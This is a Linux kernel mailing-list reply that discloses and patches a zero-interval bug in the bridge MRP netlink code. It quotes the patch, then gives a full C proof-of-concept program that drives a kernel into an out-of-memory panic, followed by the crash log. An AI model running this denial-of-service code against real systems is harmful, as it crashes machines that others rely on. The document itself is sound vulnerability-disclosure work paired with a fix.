Return-Path: <netdev+bounces-271822-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id gLOQBCerxGmD2AQAu9opvQ
	(envelope-from <netdev+bounces-271822-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 04:42:31 +0100
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 65BBD32EE17
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 04:42:30 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 74381301F995
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 03:42:12 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 47FEA38F643;
	Thu, 26 Mar 2026 03:42:12 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="Exzsfo3A"
X-Original-To: netdev@vger.kernel.org
Received: from mail-dy1-f169.google.com (mail-dy1-f169.google.com [74.125.82.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4127726E173
	for <netdev@vger.kernel.org>; Thu, 26 Mar 2026 03:42:09 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1774496532; cv=none; b=eJVT5iAdlaIMQH9OKthvUGAntY/bUta1j+3Fg+o8BkS1nOn3XDAqtkCcnC2+CxlnG87x9ifmutShH9/4gBiSI/yfbuglUUgnEYjbnrWvaImbxizSk09b+blMGdwP7sLGf680af71Okg0LEeDEyikftvPNnqxEPyCIKYzFw0ovwY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1774496532; c=relaxed/simple;
	bh=cweZaKc66bfM/LLA+0ugstFKpSKueIJw4TGmMvlTaKI=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=h33/xYhxVlbk1T4RLniJe9ymAUsZllSoueqQg1rJzBjYgXmYPkWhph3SUDc+kzSNiHSM0M7zeNEbKHIfWFD80/uBvpKezzYXDXdofwlgRQZwdSY54tLXwg6PrJR/LJhdy3tztenniThcD5fxBERqW5mEzwc18+tzTIGTaypCDAo=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=Exzsfo3A; arc=none smtp.client-ip=74.125.82.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-dy1-f169.google.com with SMTP id 5a478bee46e88-2c160cb021cso586281eec.1
        for <netdev@vger.kernel.org>; Wed, 25 Mar 2026 20:42:09 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1774496528; x=1775101328; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=hxEJSX+N7SRM79GBHFRd7FSM56bucRLuiNgC4aXl5i0=;
        b=Exzsfo3AhvZoUFEk07LtBj7bd32pJhGC4FRc2GMr1bOzNbqpbuOG0ijOZSDWCaxMMl
         GwBF1Mi3QFIazzMRL3cp/nm9YgWkdhhUBrH4aRoB7MKdmgxj5gBJm6vHVzxdy9boS2H2
         FOandIoEOldBn0i9G748qQmlXqLNtZOJ09P7L3S7We6ElnS4s/fZGtFI4j4uYx49NlJ2
         qKi50QmaX4cwiGtoYCC9lBFJ4yqr9hilUBc3XCVii6nXkP4zhexsYbjdNkDsgKefFfai
         MkDogk30E6QbxnyEdMwiMSnclIZROi/4pwp7ngOVnr5kBSHmd7BiNMS4VkqeMG15gQYn
         H+iA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1774496528; x=1775101328;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=hxEJSX+N7SRM79GBHFRd7FSM56bucRLuiNgC4aXl5i0=;
        b=U/E+yo4o04Avmcet/D+lkchGyLF/eGc4uKGdYUHCuXBdSlKVUZ/8mHwN4STPqthW8Q
         IB16fh6o5KpvlMo7p9Wr6zwHJ0sD2M2blCNcDWw3tstlKKK1v8p2LRcpRdULrS6RNYLM
         MZzUEY9fwoOLzdifzefLQFNUhwNAFUtx/Vv8elquAbKIdyDRA15hHma6tfU9rGI8weqS
         znvwOtTJPM2pnTan/Vnewb3wnj5liEPvGAvZRz+KcgvtSzWQ0LI1cBNl9JH7gyruHl4Q
         E43G5oLk529TTtXD8aclOkJ4g1/2AN1jnzxS0kUS/Cyab17YC/ayRWHMfnNb8uPdy4jp
         D5/g==
X-Gm-Message-State: AOJu0YwSiEd2Ueo/5HO8PDV9R6Dai1yP8xPgcYkIYylMzTCJnRIWte57
	6sNYDXj91sfrGs+GXIE8NUrT0tMGscwkvD1BRv5m+NsePzSKHg505OK3H1HwQXwXDL/r0YovwwN
	GMIuzbQ==
X-Gm-Gg: ATEYQzx54xsRXW1Z02OYIpwG7+zlnmPKwusCkOeRBqh4DfOMkayyJ6U7kZAZd/Kd7Vv
	XO2qg3yzex6fU4skPgk+huuled9vbIohmAFOIFxASxpcRCqqOLeT1Zl5DqInZPUF41DHBURw57h
	vBhOfyNtndIb5hnDm3fVsnZ63ssQ9AQHqyRi5GTMi+J9MFOprT+XY8m6qC/JyyP9r5Dlu5w089m
	Xams/GOGFaMeuYrc7by+H4AZeSYNPyFoKaMwmIdrwJiCnn3s9XDL2B3Uzsj9Xg2cIhNAHfaU30i
	b6MgJXjGHBBUFnfR3Jjtr0PzFgs6lSh45gK+himWugLxVW3k80L0HspUxLn7KAqe/Buk8vbEgYX
	xM2GU2o8qs5r7+n80ZAeRuB5LfuxWIMerFjXZ0D98H8TInvSBBg6lKawOuz49W+2OWp1SX8syM+
	yzUih6XY1YF0IM+Ha6FIh0KjIL4YYMeQ==
X-Received: by 2002:a05:7300:bc8a:b0:2c1:558c:16e1 with SMTP id 5a478bee46e88-2c15d32afb0mr3096520eec.4.1774496528054;
        Wed, 25 Mar 2026 20:42:08 -0700 (PDT)
Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-2c16ed9f739sm1495565eec.16.2026.03.25.20.42.07
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 25 Mar 2026 20:42:07 -0700 (PDT)
Date: Wed, 25 Mar 2026 20:42:06 -0700
From: Xiang Mei <xmei5@asu.edu>
To: netdev@vger.kernel.org
Cc: bridge@lists.linux.dev, razor@blackwall.org, idosch@nvidia.com, 
	davem@davemloft.net, edumazet@google.com, pabeni@redhat.com, horms@kernel.org, 
	bestswngs@gmail.com
Subject: Re: [PATCH net] bridge: mrp: reject zero test interval to avoid OOM
 panic
Message-ID: <c6hlzeuqi3fj26s3tu7jojlyzjfxqbw2e5tx5n2z65s52nm5u3@uwgjnvfmcmft>
References: <20260326032438.3307549-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20260326032438.3307549-1-xmei5@asu.edu>
X-Spamd-Result: default: False [-1.66 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_RHS_NOT_FQDN(0.50)[];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64:c];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[asu.edu:+];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-271822-lists,netdev=lfdr.de];
	FREEMAIL_CC(0.00)[lists.linux.dev,blackwall.org,nvidia.com,davemloft.net,google.com,redhat.com,kernel.org,gmail.com];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	MISSING_XM_UA(0.00)[];
	FROM_HAS_DN(0.00)[];
	MIME_TRACE(0.00)[0:+];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
	TO_DN_NONE(0.00)[];
	RCPT_COUNT_SEVEN(0.00)[9];
	NEURAL_HAM(-0.00)[-1.000];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	DBL_BLOCKED_OPENRESOLVER(0.00)[init.sh:url,sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,asu.edu:dkim,asu.edu:email,qemu.org:url]
X-Rspamd-Queue-Id: 65BBD32EE17
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Wed, Mar 25, 2026 at 08:24:38PM -0700, Xiang Mei wrote:
> br_mrp_start_test() and br_mrp_start_in_test() accept the user-supplied
> interval value from netlink without validation. When interval is 0,
> usecs_to_jiffies(0) yields 0, causing the delayed work
> (br_mrp_test_work_expired / br_mrp_in_test_work_expired) to reschedule
> itself with zero delay. This creates a tight loop on system_percpu_wq
> that allocates and transmits MRP test frames at maximum rate, exhausting
> all system memory and causing a kernel panic via OOM deadlock.
> 
> The same zero-interval issue applies to br_mrp_start_in_test_parse()
> for interconnect test frames.
> 
> Use NLA_POLICY_MIN(NLA_U32, 1) in the nla_policy tables for both
> IFLA_BRIDGE_MRP_START_TEST_INTERVAL and
> IFLA_BRIDGE_MRP_START_IN_TEST_INTERVAL, so zero is rejected at the
> netlink attribute parsing layer before the value ever reaches the
> workqueue scheduling code. This is consistent with how other bridge
> subsystems (br_fdb, br_mst) enforce range constraints on netlink
> attributes.
> 
> Fixes: 7ab1748e4ce6 ("bridge: mrp: Extend MRP netlink interface for configuring MRP interconnect")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/bridge/br_mrp_netlink.c | 4 ++--
>  1 file changed, 2 insertions(+), 2 deletions(-)
> 
> diff --git a/net/bridge/br_mrp_netlink.c b/net/bridge/br_mrp_netlink.c
> index ce6f63c77cc0..86f0e75d6e34 100644
> --- a/net/bridge/br_mrp_netlink.c
> +++ b/net/bridge/br_mrp_netlink.c
> @@ -196,7 +196,7 @@ static const struct nla_policy
>  br_mrp_start_test_policy[IFLA_BRIDGE_MRP_START_TEST_MAX + 1] = {
>  	[IFLA_BRIDGE_MRP_START_TEST_UNSPEC]	= { .type = NLA_REJECT },
>  	[IFLA_BRIDGE_MRP_START_TEST_RING_ID]	= { .type = NLA_U32 },
> -	[IFLA_BRIDGE_MRP_START_TEST_INTERVAL]	= { .type = NLA_U32 },
> +	[IFLA_BRIDGE_MRP_START_TEST_INTERVAL]	= NLA_POLICY_MIN(NLA_U32, 1),
>  	[IFLA_BRIDGE_MRP_START_TEST_MAX_MISS]	= { .type = NLA_U32 },
>  	[IFLA_BRIDGE_MRP_START_TEST_PERIOD]	= { .type = NLA_U32 },
>  	[IFLA_BRIDGE_MRP_START_TEST_MONITOR]	= { .type = NLA_U32 },
> @@ -316,7 +316,7 @@ static const struct nla_policy
>  br_mrp_start_in_test_policy[IFLA_BRIDGE_MRP_START_IN_TEST_MAX + 1] = {
>  	[IFLA_BRIDGE_MRP_START_IN_TEST_UNSPEC]	= { .type = NLA_REJECT },
>  	[IFLA_BRIDGE_MRP_START_IN_TEST_IN_ID]	= { .type = NLA_U32 },
> -	[IFLA_BRIDGE_MRP_START_IN_TEST_INTERVAL]	= { .type = NLA_U32 },
> +	[IFLA_BRIDGE_MRP_START_IN_TEST_INTERVAL]	= NLA_POLICY_MIN(NLA_U32, 1),
>  	[IFLA_BRIDGE_MRP_START_IN_TEST_MAX_MISS]	= { .type = NLA_U32 },
>  	[IFLA_BRIDGE_MRP_START_IN_TEST_PERIOD]	= { .type = NLA_U32 },
>  };
> -- 
> 2.43.0
>

Thanks for your attention for this bug. Considering the low severity (DoS
only), we resend this bug to the open list.

The following information could help you to reproduce the bug:

Configs:
```
CONFIG_BRIDGE=y
CONFIG_BRIDGE_MRP=y
```

PoC Source Code:
```c
/*
 * PoC: MRP zero-interval workqueue DoS (OOM panic)
 * Requires: ns_capable(CAP_NET_ADMIN), CONFIG_BRIDGE=y, CONFIG_BRIDGE_MRP=y
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>
#include <linux/if_bridge.h>
#include <net/if.h>
#include <sys/ioctl.h>

#define NLA4(l) (((l)+3)&~3)
#define NLAH    ((int)NLA4(sizeof(struct nlattr)))
#define VETH_INFO_PEER 1

static char buf[8192];
static int pos, nl_fd;
static unsigned seq = 1;

static void begin(int type, int flags) {
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *h = (void *)buf;
    h->nlmsg_type = type;
    h->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
    h->nlmsg_seq = seq++;
    pos = NLMSG_HDRLEN;
}

static void ifinfo(int fam, int idx, unsigned fl, unsigned ch) {
    struct ifinfomsg *m = (void *)(buf + pos);
    m->ifi_family = fam; m->ifi_index = idx;
    m->ifi_flags = fl; m->ifi_change = ch;
    pos += NLMSG_ALIGN(sizeof(*m));
    ((struct nlmsghdr *)buf)->nlmsg_len = pos;
}

static struct nlattr *nest(int type) {
    struct nlattr *a = (void *)(buf + pos);
    a->nla_type = type | NLA_F_NESTED;
    a->nla_len = NLAH; pos += NLAH;
    return a;
}

static void nest_end(struct nlattr *a) {
    a->nla_len = buf + pos - (char *)a;
    ((struct nlmsghdr *)buf)->nlmsg_len = pos;
}

static void nla_put(int type, const void *data, int len) {
    struct nlattr *a = (void *)(buf + pos);
    a->nla_type = type; a->nla_len = NLAH + len;
    memcpy(buf + pos + NLAH, data, len);
    pos += NLA4(NLAH + len);
    ((struct nlmsghdr *)buf)->nlmsg_len = pos;
}

static void nla_str(int type, const char *s) { nla_put(type, s, strlen(s)+1); }
static void nla_u32(int type, __u32 v) { nla_put(type, &v, 4); }
static void nla_u16(int type, __u16 v) { nla_put(type, &v, 2); }

static int talk(void) {
    struct nlmsghdr *h = (void *)buf;
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    sendto(nl_fd, buf, h->nlmsg_len, 0, (void *)&sa, sizeof(sa));
    char rb[4096];
    while (1) {
        int n = recv(nl_fd, rb, sizeof(rb), 0);
        if (n < 0) return -1;
        for (struct nlmsghdr *r = (void *)rb; NLMSG_OK(r, n); r = NLMSG_NEXT(r, n)) {
            if (r->nlmsg_seq != h->nlmsg_seq) continue;
            if (r->nlmsg_type == NLMSG_ERROR)
                return ((struct nlmsgerr *)NLMSG_DATA(r))->error;
            if (r->nlmsg_type == NLMSG_DONE) return 0;
        }
    }
}

static int getidx(const char *name) {
    struct ifreq ifr = {};
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFINDEX, &ifr);
    close(fd);
    return ifr.ifr_ifindex;
}

static void mk_veth(const char *a, const char *b) {
    begin(RTM_NEWLINK, NLM_F_CREATE | NLM_F_EXCL);
    ifinfo(AF_UNSPEC, 0, 0, 0);
    nla_str(IFLA_IFNAME, a);
    struct nlattr *li = nest(IFLA_LINKINFO);
    nla_str(IFLA_INFO_KIND, "veth");
    struct nlattr *d = nest(IFLA_INFO_DATA);
    struct nlattr *p = nest(VETH_INFO_PEER);
    memset(buf + pos, 0, sizeof(struct ifinfomsg));
    pos += NLMSG_ALIGN(sizeof(struct ifinfomsg));
    ((struct nlmsghdr *)buf)->nlmsg_len = pos;
    nla_str(IFLA_IFNAME, b);
    nest_end(p); nest_end(d); nest_end(li);
    talk();
}

static void link_up(int idx) {
    begin(RTM_NEWLINK, 0); ifinfo(AF_UNSPEC, idx, IFF_UP, IFF_UP); talk();
}

static void set_master(int idx, int master) {
    begin(RTM_NEWLINK, 0); ifinfo(AF_UNSPEC, idx, 0, 0);
    nla_u32(IFLA_MASTER, master); talk();
}

static int mrp(int idx, void (*build)(int, int), int p, int s) {
    begin(RTM_SETLINK, 0);
    ifinfo(AF_BRIDGE, idx, 0, 0);
    struct nlattr *af = nest(IFLA_AF_SPEC);
    struct nlattr *m = nest(IFLA_BRIDGE_MRP);
    build(p, s);
    nest_end(m); nest_end(af);
    return talk();
}

static void build_inst(int p, int s) {
    struct nlattr *n = nest(IFLA_BRIDGE_MRP_INSTANCE);
    nla_u32(IFLA_BRIDGE_MRP_INSTANCE_RING_ID, 1);
    nla_u32(IFLA_BRIDGE_MRP_INSTANCE_P_IFINDEX, p);
    nla_u32(IFLA_BRIDGE_MRP_INSTANCE_S_IFINDEX, s);
    nla_u16(IFLA_BRIDGE_MRP_INSTANCE_PRIO, 0x8000);
    nest_end(n);
}

static void build_role(int p, int s) {
    (void)p; (void)s;
    struct nlattr *n = nest(IFLA_BRIDGE_MRP_RING_ROLE);
    nla_u32(IFLA_BRIDGE_MRP_RING_ROLE_RING_ID, 1);
    nla_u32(IFLA_BRIDGE_MRP_RING_ROLE_ROLE, 2);
    nest_end(n);
}

static void build_test(int p, int s) {
    (void)p; (void)s;
    struct nlattr *n = nest(IFLA_BRIDGE_MRP_START_TEST);
    nla_u32(IFLA_BRIDGE_MRP_START_TEST_RING_ID, 1);
    nla_u32(IFLA_BRIDGE_MRP_START_TEST_INTERVAL, 0);      /* BUG */
    nla_u32(IFLA_BRIDGE_MRP_START_TEST_MAX_MISS, 3);
    nla_u32(IFLA_BRIDGE_MRP_START_TEST_PERIOD, 60000000);
    nla_u32(IFLA_BRIDGE_MRP_START_TEST_MONITOR, 0);
    nest_end(n);
}

int main(void) {
    printf("[*] MRP zero-interval DoS PoC\n");

    nl_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    bind(nl_fd, (void *)&sa, sizeof(sa));

    /* bridge + 2 veth pairs */
    begin(RTM_NEWLINK, NLM_F_CREATE | NLM_F_EXCL);
    ifinfo(AF_UNSPEC, 0, 0, 0);
    nla_str(IFLA_IFNAME, "br0");
    struct nlattr *li = nest(IFLA_LINKINFO);
    nla_str(IFLA_INFO_KIND, "bridge"); nest_end(li);
    talk();

    mk_veth("mp0", "mp0p");
    mk_veth("ms0", "ms0p");

    int br = getidx("br0"), pi = getidx("mp0"), si = getidx("ms0");
    set_master(pi, br); set_master(si, br);
    link_up(br); link_up(pi); link_up(si);
    link_up(getidx("mp0p")); link_up(getidx("ms0p"));

    /* MRP: instance → role → test(interval=0) */
    if (mrp(pi, build_inst, pi, si) < 0) return 1;
    mrp(pi, build_role, pi, si);
    mrp(pi, build_test, pi, si);

    printf("[+] Waiting for OOM panic...\n");
    sleep(120);
    return 0;
}
```

The intended crash:
```
[   10.874074] Out of memory: Killed process 143 (exploit) total-vm:1032kB, anon-rss:64kB, file-rss:4kB, shmem-rss:684kB, UID:0 pgtables:40kB oom_score_adj:0
[   10.876511] Out of memory: Killed process 142 (su) total-vm:4528kB, anon-rss:388kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:52kB oom_score_adj:0
[   10.879768] Out of memory: Killed process 140 (su) total-vm:4508kB, anon-rss:376kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:52kB oom_score_adj:0
[   10.880885] Out of memory: Killed process 129 (init.sh) total-vm:3992kB, anon-rss:264kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:44kB oom_score_adj:0
[   10.883589] Out of memory: Killed process 141 (bash) total-vm:3912kB, anon-rss:248kB, file-rss:4kB, shmem-rss:0kB, UID:0 pgtables:48kB oom_score_adj:0
[   10.886036] Kernel panic - not syncing: System is deadlocked on memory
[   10.886394] CPU: 0 UID: 0 PID: 1 Comm: init Not tainted 7.0.0-rc4+ #6 PREEMPTLAZY
[   10.886803] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.17.0-0-gb52ca86e094d-prebuilt.qemu.org 04/01/2014
[   10.887379] Call Trace:
[   10.887518]  <TASK>
[   10.887626]  vpanic+0x694/0x780
[   10.887785]  ? __pfx_vpanic+0x10/0x10
[   10.887965]  ? __pfx__raw_spin_lock+0x10/0x10
[   10.888199]  panic+0xca/0xd0
[   10.888349]  ? __pfx_panic+0x10/0x10
[   10.888531]  ? panic_on_this_cpu+0x1a/0x40
[   10.888738]  out_of_memory+0x124e/0x1350
[   10.888921]  ? __pfx_out_of_memory+0x10/0x10
[   10.889132]  __alloc_pages_slowpath.constprop.0+0x2325/0x2dd0
[   10.889426]  ? __pfx_do_wp_page+0x10/0x10
[   10.889618]  ? __pfx___alloc_pages_slowpath.constprop.0+0x10/0x10
[   10.889911]  ? __alloc_frozen_pages_noprof+0x4f8/0x800
[   10.890178]  __alloc_frozen_pages_noprof+0x4f8/0x800
[   10.890417]  ? __pfx___alloc_frozen_pages_noprof+0x10/0x10
[   10.890678]  ? alloc_pages_mpol+0x13a/0x390
[   10.890883]  ? __pfx_alloc_pages_mpol+0x10/0x10
[   10.891106]  alloc_pages_mpol+0x13a/0x390
[   10.891313]  ? __pfx_alloc_pages_mpol+0x10/0x10
[   10.891535]  ? xas_load+0x18/0x270
[   10.891704]  folio_alloc_noprof+0x16/0xd0
[   10.891903]  filemap_alloc_folio_noprof.part.0+0x1f7/0x350
[   10.892188]  ? __pfx_filemap_alloc_folio_noprof.part.0+0x10/0x10
[   10.892485]  ? page_cache_ra_unbounded+0x351/0x7b0
[   10.892740]  __filemap_get_folio_mpol+0x278/0x4f0
[   10.892969]  filemap_fault+0x10eb/0x2fc0
[   10.893177]  ? __pfx_filemap_fault+0x10/0x10
[   10.893384]  ? recalc_sigpending+0x19b/0x230
[   10.893588]  __do_fault+0xf4/0x6d0
[   10.893751]  do_fault+0x891/0x11f0
[   10.893919]  __handle_mm_fault+0x918/0x1400
[   10.894126]  ? __pfx___handle_mm_fault+0x10/0x10
[   10.894369]  ? __pfx_vma_start_read+0x10/0x10
[   10.894585]  ? __pfx_lock_vma_under_rcu+0x10/0x10
[   10.894809]  handle_mm_fault+0x464/0xc70
[   10.894999]  do_user_addr_fault+0x27b/0xbb0
[   10.895209]  exc_page_fault+0x6b/0xe0
[   10.895385]  asm_exc_page_fault+0x26/0x30
[   10.895569] RIP: 0033:0x572bb2c72c30
[   10.895733] Code: Unable to access opcode bytes at 0x572bb2c72c06.
[   10.896007] RSP: 002b:00007ffdf17d8538 EFLAGS: 00010246
[   10.896255] RAX: 0000000000000000 RBX: 0000572bb2c81b28 RCX: 00007ff928e02dba
[   10.896590] RDX: 00007ffdf17d8540 RSI: 00007ffdf17d8670 RDI: 0000000000000011
[   10.896915] RBP: 00007ffdf17d9270 R08: 0000000000000000 R09: 00007ff928f10580
[   10.897242] R10: 0000000000000000 R11: 0000000000000246 R12: 0000572bb2c81b90
[   10.897556] R13: 0000000000000001 R14: 0000000000000000 R15: 00007ffdf17d926c
[   10.897872]  </TASK>
[   10.898040] Kernel Offset: disabled
```

This bug is a DoS bug requiring ns_capable(CAP_NET_ADMIN).
Please let me know if you have any questions for the patch and poc.

Thanks,
Xiang

